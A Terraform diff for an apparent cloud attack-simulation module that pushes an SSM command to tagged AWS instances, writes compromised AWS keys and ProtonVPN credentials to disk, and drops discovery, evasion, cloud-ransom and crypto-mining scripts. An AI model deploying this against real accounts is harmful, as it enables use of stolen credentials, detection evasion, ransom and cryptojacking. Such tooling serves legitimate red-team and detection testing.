@@ -1,8 +1,8 @@
 locals {
     attack_dir = "/cloud-tunnel"
-    aws_creds = join("\n", [ for u,k in data.template_file.aws: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
+    aws_creds = join("\n", [ for u,k in var.compromised_credentials: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
     payload = <<-EOT
-    LOGFILE=/tmp/attacker_exec_docker_compromised_credentials_attacker.log
+    LOGFILE=/tmp/attacker_exec_docker_compromised_keys_attacker.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
@@ -19,13 +19,14 @@ locals {
     ${local.aws_creds}
     echo '${base64encode(data.template_file.start.rendered)}' | base64 -d > /${local.attack_dir}/start.sh
     echo '${base64encode(data.template_file.protonvpn.rendered)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
+    echo '${base64encode(data.template_file.protonvpn-baseline.rendered)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
     echo '${base64encode(data.template_file.baseline.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
     echo '${base64encode(data.template_file.discovery.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
     echo '${base64encode(data.template_file.evasion.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
     echo '${base64encode(data.template_file.cloudransom.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
     echo '${base64encode(data.template_file.cloudcrypto.rendered)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
     echo '${base64encode(data.template_file.hostcrypto.rendered)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
-    chmod -R 755 /${local.attack_dir}/*.sh
+    chmod 755 /${local.attack_dir}/*.sh
     log "Checking for docker..."
     while ! which docker; do
         log "docker not found - waiting"
@@ -37,17 +38,6 @@ locals {
     base64_payload = base64encode(local.payload)
 }
 
-data "template_file" "aws" {
-    for_each = var.compromised_credentials
-    template = file("${path.module}/resources/aws.env.tpl")
-
-    vars = {
-        aws_access_key_id = each.value.id
-        aws_default_region = var.region
-        aws_secret_access_key = each.value.secret
-    }
-}
-
 data "template_file" "protonvpn" {
     template = file("${path.module}/resources/protonvpn.env.tpl")
 
@@ -55,6 +45,18 @@ data "template_file" "protonvpn" {
         protonvpn_user = var.protonvpn_user
         protonvpn_password = var.protonvpn_password
         protonvpn_server = var.protonvpn_server
+        protonvpn_tier = tostring(var.protonvpn_tier)
+        protonvpn_protocol = var.protonvpn_protocol
+    }
+}
+
+data "template_file" "protonvpn-baseline" {
+    template = file("${path.module}/resources/protonvpn.env.tpl")
+
+    vars = {
+        protonvpn_user = var.protonvpn_user
+        protonvpn_password = var.protonvpn_password
+        protonvpn_server = "US"
         protonvpn_tier = tostring(var.protonvpn_tier)
         protonvpn_protocol = var.protonvpn_protocol
     }
@@ -101,8 +103,8 @@ data "template_file" "start" {
     template = file("${path.module}/resources/start.sh.tpl")
 }
 
-resource "aws_ssm_document" "exec_docker_compromised_credentials_attacker" {
-  name          = "exec_docker_compromised_credentials_attacker"
+resource "aws_ssm_document" "exec_docker_compromised_keys_attacker" {
+  name          = "exec_docker_compromised_keys_attacker"
   document_type = "Command"
 
   content = jsonencode(
@@ -112,7 +114,7 @@ resource "aws_ssm_document" "exec_docker_compromised_credentials_attacker" {
         "mainSteps": [
             {
                 "action": "aws:runShellScript",
-                "name": "exec_docker_compromised_credentials_attacker",
+                "name": "exec_docker_compromised_keys_attacker",
                 "precondition": {
                     "StringEquals": [
                         "platformType",
@@ -131,11 +133,11 @@ resource "aws_ssm_document" "exec_docker_compromised_credentials_attacker" {
     })
 }
 
-resource "aws_resourcegroups_group" "exec_docker_compromised_credentials_attacker" {
-    name = "exec_docker_compromised_credentials_attacker"
+resource "aws_resourcegroups_group" "exec_docker_compromised_keys_attacker" {
+    name = "exec_docker_compromised_keys_attacker"
 
     resource_query {
-        query = jsonencode(var.resource_query_exec_docker_compromised_credentials_attacker)
+        query = jsonencode(var.resource_query_exec_docker_compromised_keys_attacker)
     }
 
     tags = {
@@ -144,15 +146,15 @@ resource "aws_resourcegroups_group" "exec_docker_compromised_credentials_attacke
     }
 }
 
-resource "aws_ssm_association" "exec_docker_compromised_credentials_attacker" {
-    association_name = "exec_docker_compromised_credentials_attacker"
+resource "aws_ssm_association" "exec_docker_compromised_keys_attacker" {
+    association_name = "exec_docker_compromised_keys_attacker"
 
-    name = aws_ssm_document.exec_docker_compromised_credentials_attacker.name
+    name = aws_ssm_document.exec_docker_compromised_keys_attacker.name
 
     targets {
         key = "resource-groups:Name"
         values = [
-            aws_resourcegroups_group.exec_docker_compromised_credentials_attacker.name,
+            aws_resourcegroups_group.exec_docker_compromised_keys_attacker.name,
         ]
     }
 
